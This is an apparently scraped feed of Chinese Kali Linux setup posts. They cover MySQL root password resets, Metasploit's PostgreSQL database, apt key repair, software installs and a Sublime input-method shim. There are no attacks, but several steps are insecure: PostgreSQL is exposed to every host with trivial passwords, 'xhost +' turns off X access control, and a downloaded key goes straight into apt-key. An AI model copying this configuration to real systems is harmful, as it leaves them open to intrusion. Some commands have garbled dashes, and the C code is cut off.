class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">[client]</div><div class="line">default-character-set = utf8</div><div class="line">[mysqld]</div><div class="line">default-storage-engine = INNODB</div><div class="line">character-set-server = utf8</div><div class="line">collation-server = utf8_general_ci</div></pre></td></tr></table></figure><p>3、更新MySQL的用户名密码</p><p>首先查看MySQL是否运行，确保MySQL是stop状态，可以使用/etc/init.d/mysql stop停止运行</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">root@kali:~# /etc/init.d/mysql status</div><div class="line">[info] MySQL is stopped..</div></pre></td></tr></table></figure><p>然后启动MySQL的server/daemon process</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">root@kali:~# mysqld_safe –skip-grant-tables &amp;</div></pre></td></tr></table></figure><p>使用root用户连接MySQL</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">root@kali:~# mysql -u root</div><div class="line">Welcome to the MySQL monitor.  Commands end with ; or \g.</div><div class="line">Your MySQL connection id is 1</div><div class="line">Server version: 5.5.44–0+deb7u1 (Debian)</div><div class="line">Copyright (c) 2000, 2015, Oracle and/or its affiliates. All rights reserved.</div><div class="line">Oracle is a registered trademark of Oracle Corporation and/or its</div><div class="line">affiliates. Other names may be trademarks of their respective</div><div class="line">owners.</div><div class="line">Type ‘help;’ or ‘\h’ for help. Type ‘\c’ to clear the current input statement.</div><div class="line">mysql&gt;</div></pre></td></tr></table></figure><p>更改root用户的密码为admin</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">mysql&gt; use mysql</div><div class="line">Reading table information for completion of table and column names</div><div class="line">You can turn off this feature to get a quicker startup with -A</div><div class="line">Database changed</div><div class="line">mysql&gt; update user set password=PASSWORD(‘admin’) where User=‘root’;</div><div class="line">Query OK, 4 rows affected (0.01 sec)</div><div class="line">Rows matched: 4  Changed: 4  Warnings: 0</div></pre></td></tr></table></figure><p>执行更新命令</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">mysql&gt; flush privileges;</div><div class="line">Query OK, 0 rows affected (0.00 sec)</div></pre></td></tr></table></figure><p>flush privileges 命令本质上的作用是将当前user和privilige表中的用户信息/权限设置从mysql库(MySQL数据库的内置库)中提取到内存里。MySQL用户数据和权限有修改后，希望在”不重启MySQL服务”的情况下直接生效，那么就需要执行这个命令。通常是在修改ROOT帐号的设置后，怕重启后无法再登录进来，那么直接flush之后就可以看权限设置是否生效。而不必冒太大风险。</p><p>退出</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">mysql&gt; quit</div></pre></td></tr></table></figure><p>4、验证用户密码是否更新成功</p><p>重启MySQL</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">root@kali:~# /etc/init.d/mysql restart</div><div class="line">[ ok ] Stopping MySQL database server: mysqld.</div><div class="line">[….] Starting MySQL database server: mysqld151015 11:41:36 mysqld_safe mysqld from pid file /var/run/mysqld/mysqld.pid ended</div><div class="line">[ .k</div><div class="line">[info] Checking for tables which need an upgrade, are corrupt or were</div><div class="line">not closed cleanly..</div><div class="line">[1]+  完成                  mysqld_safe –skip-grant-tables</div></pre></td></tr></table></figure><p>使用root用户连接MySQL</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">root@kali:~# mysql -u root -p</div><div class="line">Enter password:</div><div class="line">Welcome to the MySQL monitor.  Commands end with ; or \g.</div><div class="line">Your MySQL connection id is 43</div><div class="line">Server version: 5.5.44–0+deb7u1 (Debian)</div><div class="line">Copyright (c) 2000, 2015, Oracle and/or its affiliates. All rights reserved.</div><div class="line">Oracle is a registered trademark of Oracle Corporation and/or its</div><div class="line">affiliates. Other names may be trademarks of their respective</div><div class="line">owners.</div><div class="line">Type ‘help;’ or ‘\h’ for help. Type ‘\c’ to clear the current input statement.</div><div class="line">mysql&gt;</div></pre></td></tr></table></figure><h4 id="metasploit-Database-not-connect问题解决"><a href="#metasploit-Database-not-connect问题解决" class="headerlink" title="metasploit Database not connect问题解决"></a>metasploit Database not connect问题解决</h4><p>1、postgresql是本身没有启动的。所以需要启动。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">service postgresql start</div></pre></td></tr></table></figure><p>2、通过命令进入配置</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">sudo -u postgres psql</div><div class="line">ALTER USER postgres WITH PASSWORD ‘123.com’;</div></pre></td></tr></table></figure><p>注意1：‘123.com’这个是密码。<br>注意2：分号！！！！一定要带上分号“；”。<br>注意3：\q：退出数据库</p><p>3、修改linux系统的postgres用户的密码（密码与数据库用户postgres的密码相同）</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">root@kali:~# sudo passwd -d postgres</div><div class="line">passwd：密码过期信息已更改。</div><div class="line">root@kali:~# sudo -u postgres passwd</div><div class="line">输入新的 UNIX 密码：</div><div class="line">重新输入新的 UNIX 密码：</div><div class="line">passwd：已成功更新密码</div></pre></td></tr></table></figure><p>4、修改PostgresSQL数据库配置实现远程访问</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">root@kali:~# vi /etc/postgresql/9.4/main/postgresql.conf</div><div class="line">更改#listen_addresses = ‘localhost’为 listen_addresses = ‘*’</div><div class="line">更改#password_encryption = on为password_encryption = on</div><div class="line">root@kali:~# vi /etc/postgresql/9.4/main/pg_hba.conf</div><div class="line">在文档末尾加上以下内容</div><div class="line"># to allow your client visiting postgresql server</div><div class="line">host all all 0.0.0.0 0.0.0.0 md5</div><div class="line">root@kali:~# service postgresql restart</div></pre></td></tr></table></figure><p>注意1：“#”号，一定要把“#”删除掉。<br>注意2：在vi编辑模式下点击键盘字母a是进入编辑模式，编辑完成后点击“esc”退出编辑模式然后在最下方输入“：wq”保存并退出。</p><p>5、管理PostgreSQL用户和数据库</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">root@kali:~# psql -U postgres -h 127.0.0.1</div></pre></td></tr></table></figure><p>用户 postgres 的口令：<br>psql (9.4.6)<br>SSL连接 (协议: TLSv1.2, 加密：ECDHE-RSA-AES256-GCM-SHA384，二进制位: 256, 压缩比: 关闭)<br>输入 “help” 来获取帮助信息</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">postgres=# create user “msf123” with password ‘123456’ nocreatedb;</div><div class="line">CREATE ROLE</div><div class="line">postgres=# create database “msf1” with owner=”msf123”;</div><div class="line">ERROR: role “”msf123”” does not exist</div><div class="line">postgres=# create database “msf1″ with owner=”msf123”;</div><div class="line">CREATE DATABASE</div><div class="line">postgres=# \q</div></pre></td></tr></table></figure><p>注意1：还是要注意分号！！！没有分号命令就无法执行。<br>注意2：注意复制的时候“”符号问题。<br>注意3：user后面是用户名，password后面是用户名对应的密码。<br>注意4：命令执行后有返回结果才是执行成功了。</p><p>6、msf配置连接</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">root@kali:~# msfconsole</div><div class="line">msf &gt; db_status</div><div class="line">[*] postgresql selected, no connection</div><div class="line">msf &gt; db_connect msf123:123456@127.0.0.1/msf1</div><div class="line">[*] Rebuilding the module cache in the background…</div><div class="line">msf &gt; db_status</div><div class="line">[*] postgresql connected to msf1</div><div class="line">msf &gt;</div></pre></td></tr></table></figure><p>在msf启动后连接数据库就好。<br>注意1：“msf123:123456”这个是步骤5中的<br>“create user “msf123” with password ‘123456’ nocreatedb;”所建立的。<br>“127.0.0.1”是指本机。<br>“msf1”这个是库名。<br>注意2：“[*] postgresql connected to msf1”这个是说明以链接成功数据库。</p><h4 id="kali-linux-apt-get-证书校验错误"><a href="#kali-linux-apt-get-证书校验错误" class="headerlink" title="kali linux apt-get 证书校验错误"></a>kali linux apt-get 证书校验错误</h4><p>错误信息</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">root@teamserver:~# apt-get update</div><div class="line">Get:1 http://mirror.neostrada.nl/kali kali-rolling InRelease [30.5 kB]</div><div class="line">Err:1 http://mirror.neostrada.nl/kali kali-rolling InRelease</div><div class="line">  The following signatures were invalid: EXPKEYSIG ED444FF07D8D0BF6 Kali Linux Repository &lt;devel@kali.org&gt;</div><div class="line">Fetched 30.5 kB in 1s (25.5 kB/s)</div><div class="line">Reading package lists... Done</div><div class="line">W: An error occurred during the signature verification. The repository is not updated and the previous index files will be used. GPG error: http://mirror.neostrada.nl/kali kali-rolling InRelease: The following signatures were invalid: EXPKEYSIG ED444FF07D8D0BF6 Kali Linux Repository &lt;devel@kali.org&gt;</div><div class="line">W: Failed to fetch http://http.kali.org/kali/dists/kali-rolling/InRelease  The following signatures were invalid: EXPKEYSIG ED444FF07D8D0BF6 Kali Linux Repository &lt;devel@kali.org&gt;</div><div class="line">W: Some index files failed to download. They have been ignored, or old ones used instead.</div></pre></td></tr></table></figure><p>Kali 证书链过期 重新下载新的证书链</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">wget -q -O - archive.kali.org/archive-key.asc | apt-key add</div></pre></td></tr></table></figure><p>####安装32位运行库</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">dpkg --add-architecture i386</div><div class="line">apt-get update</div><div class="line">apt-get install lib32z1 lib32ncurses5</div></pre></td></tr></table></figure>]]></content>
      
      
    </entry>
    
    <entry>
      <title>kali linux 2016 使用指南(一)</title>
      <link href="/2017/01/21/kali-linux-2016-%E4%BD%BF%E7%94%A8%E6%8C%87%E5%8D%97-%E4%B8%80/"/>
      <url>/2017/01/21/kali-linux-2016-%E4%BD%BF%E7%94%A8%E6%8C%87%E5%8D%97-%E4%B8%80/</url>
      <content type="html"><![CDATA[<h4 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h4><p>Kali Linux官方于8月30日发布Kali Linux 2016的第二个版本Kali Linux 2016.2。该版本距离Kali Linux 2016.1版本发布，已经有7个月。在这期间，在Kali Linux 2016.2版本发布的这段时间，Kali Linux官方增补了94个更新。</p><p>主要的更新大概是这个样子：</p><ul><li><p>Kali Linux 2016系统中的音量调整按钮归并到右上角的关闭按钮，点击关闭按钮，就可以看到音量调整滑块按钮。</p></li><li><p>使用Kali Linux 2016系统在VMWare虚拟机时，在安装增强工具open-vm-tools后，复制较大文件，会出现复制进度对话框。该对话框消失后，文件并没有出现在目标位置。这时，再次粘贴一次，就可以了。如果还是没有要复制的文件，用户可以在根目录下的/tmp/VMwareDnD中找到临时文件夹。复制的文件保存在该文件夹中。</p></li><li><p>Kali Linux 2016.2默认浏览器不再是Iceweasel，替换为FireFox ESR。该版本不会像FireFox普通版本频繁更新</p><p><img src="https://www.kali.org/wp-content/uploads/2016/08/gnome-1024x768.png" alt="1"></p><p>​</p></li></ul><p>关于kali使用前的一些配置，网上有很多版本，但是不是老就是很不实用。而且现在kali已经更新到了2016.2版，大多新手肯定都想安装最新版进行尝试，那么接下来我就简记一下我安装和使用过程中，对一些问题的解决。</p><h4 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h4><p>具体的安装步骤就不说了，大家都懂得</p><p>可以参考：<a href="http://jingyan.baidu.com/article/93f9803f04e292e0e46f5533.html" target="_blank" rel="external">《虚拟机安装kali2.0》</a></p><p>不想装的，官方也提供了ova文件，可以一键导入虚拟机。</p><p>在过去的几个月里，kali官方增加了新的相关工具，修复了固定的各种bug和操作系统的改进。一些Busybox添加了HTTPS支持，现在可以设置安全的支持SSL的kali，更方便快捷的安装kali。</p><h4 id="系统更新"><a href="#系统更新" class="headerlink" title="系统更新"></a>系统更新</h4><p>kali linux的更新源很重要，一定要选好，rolling的选rolling的源。</p><p>首先：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">leafpad /etc/apt/sources.list</div></pre></td></tr></table></figure><p>然后复制粘贴下面的源:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div></pre></td><td class="code"><pre><div class="line">#kali官方源</div><div class="line"></div><div class="line">deb http://http.kali.org/kali kali-rolling main non-free contrib</div><div class="line"></div><div class="line">#中科大的源</div><div class="line"></div><div class="line">deb http://mirrors.ustc.edu.cn/kali kali-rolling main non-free contrib</div><div class="line"></div><div class="line">deb http://mirrors.ustc.edu.cn/kali kali-rolling main contrib non-free</div><div class="line"></div><div class="line">deb-src http://mirrors.ustc.edu.cn/kali kali-rolling main contrib non-free</div><div class="line"></div><div class="line">deb http://mirrors.ustc.edu.cn/kali-security kali-current/updates main contrib non-free</div><div class="line"></div><div class="line">deb-src http://mirrors.ustc.edu.cn/kali-security kali-current/updates main contrib non-free</div><div class="line"></div><div class="line">#阿里云源</div><div class="line"></div><div class="line">deb http://mirrors.aliyun.com/kali sana main non-free contrib</div><div class="line"></div><div class="line">deb http://mirrors.aliyun.com/kali-security/ sana/updates main contrib non-free</div><div class="line"></div><div class="line">deb-src http://mirrors.aliyun.com/kali-security/ sana/updates main contrib non-free</div></pre></td></tr></table></figure><p>然后更新并安装:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">apt-get update &amp;&amp; apt-get dist-upgrade</div></pre></td></tr></table></figure><h4 id="安装内核头（这个很多人都在问怎么办）"><a href="#安装内核头（这个很多人都在问怎么办）" class="headerlink" title="安装内核头（这个很多人都在问怎么办）"></a>安装内核头（这个很多人都在问怎么办）</h4><p>我给出我的解决办法，总之还是升级内核</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">$ uname -r</div><div class="line">$ 4.3.0-kali1-amd64</div></pre></td></tr></table></figure><p>如果你使用我给出的源进行更新的话就会升级到4.6.0-kali1-amd64</p><p>这时候使用命令:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">apt-get install linux-headers-$(uname -r)</div></pre></td></tr></table></figure><p>就可以了。</p><h4 id="安装浏览器"><a href="#安装浏览器" class="headerlink" title="安装浏览器"></a>安装浏览器</h4><h5 id="1-汉化火狐浏览器"><a href="#1-汉化火狐浏览器" class="headerlink" title="1.汉化火狐浏览器"></a>1.汉化火狐浏览器</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">apt-get install iceweasel-l10n-zh-cn</div></pre></td></tr></table></figure><h5 id="2-安装并使用chrome"><a href="#2-安装并使用chrome" class="headerlink" title="2.安装并使用chrome"></a>2.安装并使用chrome</h5><p>先下载chrome的deb安装包</p><p>执行dpkg -i google-chrome-xxx.deb你会发现报错，不用慌接下来执行</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">apt–get install libappindicator1</div></pre></td></tr></table></figure><p>可能还会报错，别慌，执行:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">apt-get -f install</div></pre></td></tr></table></figure><p>然后安装完成，但是你会发现不能运行，原因是权限问题</p><p>我们添加一个用户:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">adduser zeroyu</div></pre></td></tr></table></figure><p>然后一路回车，最后敲Y</p><p>之后按次序执行</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">$ xhost +</div><div class="line">$ su zeroyu</div></pre></td></tr></table></figure><p>之后敲入 google-chrome就好了</p><h4 id="安装中文输入法"><a href="#安装中文输入法" class="headerlink" title="安装中文输入法"></a>安装中文输入法</h4><p>个人喜欢搜狗输入法，所以再次给出搜狗输入法的安装方法</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">apt-get install fcitx</div><div class="line">dpkg -i sougoupinyinXXX.deb</div><div class="line">apt-get -f install</div></pre></td></tr></table></figure><p>最后重启电脑就好了。（<a href="http://pinyin.sogou.com/linux/" target="_blank" rel="external">搜狗输入法安装包下载</a>）</p><h4 id="安装百度云"><a href="#安装百度云" class="headerlink" title="安装百度云"></a>安装百度云</h4><p>宝宝的好多小秘密还藏在上面必须安装一下</p><p>依次执行：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">git clone https://github.com/LiuLang/bcloud-packages</div><div class="line">apt-get -f install</div><div class="line">dpkg -i bcloud-x.x.x.deb</div></pre></td></tr></table></figure><h4 id="安装为知笔记"><a href="#安装为知笔记" class="headerlink" title="安装为知笔记"></a>安装为知笔记</h4><p>到<a href="http://ppa.launchpad.net/wiznote-team/ppa/ubuntu/pool/main/w/wiznote/" target="_blank" rel="external">wiznote安装包下载地址</a>找到相应的deb安装包</p><p>然后：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">dpkg –i wiznote_2.3xxxx.deb</div></pre></td></tr></table></figure><h4 id="安装shadowsocks"><a href="#安装shadowsocks" class="headerlink" title="安装shadowsocks"></a>安装shadowsocks</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">pip installshadowsocks–gtk</div></pre></td></tr></table></figure><p>终端输入shadowsocks-gtk敲回车就可以看到ui界面了。</p><h4 id="解决字体重叠问题"><a href="#解决字体重叠问题" class="headerlink" title="解决字体重叠问题"></a>解决字体重叠问题</h4><p>这里先解决下碰到的坑</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">apt–get install ttf–wqy–microhei ttf–wqy–zenhei xfonts–wqy</div></pre></td></tr></table></figure><p>重启终端就好了，这个最好在安装内核头之前完成！</p><h4 id="VPN安装"><a href="#VPN安装" class="headerlink" title="VPN安装"></a>VPN安装</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">leafpad /etc/NetworkManager/NetworkManager.conf</div></pre></td></tr></table></figure><p>修改最后一行的managed=false改为managed=true</p><p>然后执行下面的命令:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">apt–get install network–manager–openvpn–gnome</div><div class="line">apt–get install network–manager–pptp</div><div class="line">apt–get install network–manager–pptp–gnome</div><div class="line">apt–get install network–manager–strongswan</div><div class="line">apt–get install network–manager–vpnc</div><div class="line">apt–get install network–manager–vpnc–gnome</div><div class="line">/etc/init.d/network–manager restart</div></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">apt-get -y install network-manager-gnomemv /etc/network/interfaces /etc/network/interfaces.bak touch /etc/network/interfaces echo “auto lo” &gt; /etc/network/interfaces echo “iface lo inet loopback” &gt;&gt; /etc/network/interfaces service network-manager start</div></pre></td></tr></table></figure><h4 id="docker安装"><a href="#docker安装" class="headerlink" title="docker安装"></a>docker安装</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">apt–get update</div><div class="line">apt–get install docker.io</div></pre></td></tr></table></figure><h4 id="Redis安装"><a href="#Redis安装" class="headerlink" title="Redis安装"></a>Redis安装</h4><p><a href="http://redis.io/download" target="_blank" rel="external">redis下载</a></p><p>下载完后先编译</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">tar xvf redis–x.x.x.tar.gz</div><div class="line">cd redis–x.x.x</div><div class="line">make</div></pre></td></tr></table></figure><p>而后安装:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">sudo make install</div><div class="line">cd utils</div><div class="line">sudo ./install_server.sh</div></pre></td></tr></table></figure><p>接下来一步一步设置就好</p><h4 id="Mac安装后启动问题的解决"><a href="#Mac安装后启动问题的解决" class="headerlink" title="Mac安装后启动问题的解决"></a>Mac安装后启动问题的解决</h4><p>其实安装跟其它都一样，就是安装后启动要等好久（当然你也可以每次启动都按下option进行选择启动）</p><p>解决方法就是</p><p>插入macOS的安装光盘，重新启动，按住option 通过光盘启动 进入安装界面 从菜单选择terminal：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">bless –device /dev/disk0 –setBoot –legacy –verbose</div></pre></td></tr></table></figure><p>#这里的disk0是安装grub的分区，可以通过diskutil list来进行查看</p><p>最后:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">reboot</div></pre></td></tr></table></figure><p>ok，这样单引导安装就完成了。</p><h4 id="网易云音乐正确安装姿势"><a href="#网易云音乐正确安装姿势" class="headerlink" title="网易云音乐正确安装姿势"></a>网易云音乐正确安装姿势</h4><p>下载<a href="http://music.163.com/#/download" target="_blank" rel="external">网易云音乐（deepin版）</a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">dpkg –i 网易云.deb</div></pre></td></tr></table></figure><p>注意!之后还要到/usr/share目录下的application目录找到网易云音乐，右键在命令后加一句：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">—no–sandbox</div></pre></td></tr></table></figure><p>这样就ok了。</p><h4 id="安装sun-java"><a href="#安装sun-java" class="headerlink" title="安装sun java"></a>安装sun java</h4><ol><li><h5 id="下载最新的JAVA-JDK"><a href="#下载最新的JAVA-JDK" class="headerlink" title="下载最新的JAVA JDK"></a>下载最新的JAVA JDK</h5></li></ol><p><a href="http://www.oracle.com/technetwork/java/javase/downloads/jdk8-downloads-2133151.html" target="_blank" rel="external">jdk-8u91-linux-x64</a></p><ol><li><h5 id="解压缩文件并移动至-opt"><a href="#解压缩文件并移动至-opt" class="headerlink" title="解压缩文件并移动至/opt"></a>解压缩文件并移动至/opt</h5></li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">tar -xzvf jdk-8u91-linux-x64.tar.gz</div><div class="line">mv jdk1.8.0_91 /opt</div><div class="line">cd /opt/jdk1.8.0_91</div></pre></td></tr></table></figure><ol><li><h5 id="设置环境变量"><a href="#设置环境变量" class="headerlink" title="设置环境变量"></a>设置环境变量</h5></li></ol><p>1）执行 gedit ~/.bashrc ， 并添加下列内容</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"># install JAVA JDK</div><div class="line">export JAVA_HOME=/opt/jdk1.8.0_91</div><div class="line">export CLASSPATH=.:$&#123;JAVA_HOME&#125;/lib</div><div class="line">export PATH=$&#123;JAVA_HOME&#125;/bin:$PATH</div></pre></td></tr></table></figure><p>2）执行 source ~/.bashrc</p><ol><li><h5 id="安装并注册"><a href="#安装并注册" class="headerlink" title="安装并注册"></a>安装并注册</h5></li></ol><p>执行：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">update-alternatives --install /usr/bin/java java /opt/jdk1.8.0_91/bin/java 1</div><div class="line">update-alternatives --install /usr/bin/javac javac /opt/jdk1.8.0_91/bin/javac 1</div><div class="line">update-alternatives --set java /opt/jdk1.8.0_91/bin/java</div><div class="line">update-alternatives --set javac /opt/jdk1.8.0_91/bin/javac</div></pre></td></tr></table></figure><p>查看结果：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">update-alternatives --config java</div><div class="line">update-alternatives --config javac</div></pre></td></tr></table></figure><h5 id="5-测试"><a href="#5-测试" class="headerlink" title="5. 测试"></a>5. 测试</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">java -version</div><div class="line">#output </div><div class="line">java version &quot;1.8.0_91&quot;</div><div class="line">Java(TM) SE Runtime Environment (build 1.8.0_91-b14)</div><div class="line">Java HotSpot(TM) 64-Bit Server VM (build 25.91-b14, mixed mode)</div></pre></td></tr></table></figure><h4 id="解决sublime的中文输入问题"><a href="#解决sublime的中文输入问题" class="headerlink" title="解决sublime的中文输入问题"></a>解决sublime的中文输入问题</h4><ol><li>保存下述代码为 <code>sublime-imfix.c</code> 文件</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div></pre></td><td class="code"><pre><div class="line">/*</div><div class="line">sublime-imfix.c</div><div class="line">Use LD_PRELOAD to interpose some function to fix sublime input method support for linux.</div><div class="line">By Cjacker Huang</div><div class="line"></div><div class="line">gcc -shared -o libsublime-imfix.so sublime-imfix.c `pkg-config --libs --cflags gtk+-2.0` -fPIC</div><div class="line">LD_PRELOAD=./libsublime-imfix.so subl</div><div class="line">*/</div><div class="line">#include &lt;gtk/gtk.h&gt;</div><div class="line">#include &lt;gdk/gdkx.h&gt;</div><div class="line">typedef GdkSegment GdkRegionBox;</div><div class="line"></div><div class="line">struct _GdkRegion</div><div class="line">&#123;</div><div class="line">  long size;</div><div class="line">  long numRects;</div><div class="line">  GdkRegionBox *rects;</div><div class="line">  GdkRegionBox extents;</div><div class="line">&#125;;</div><div class="line"></div><div class="line">GtkIMContext *local_context;</div><div class="line"></div><div 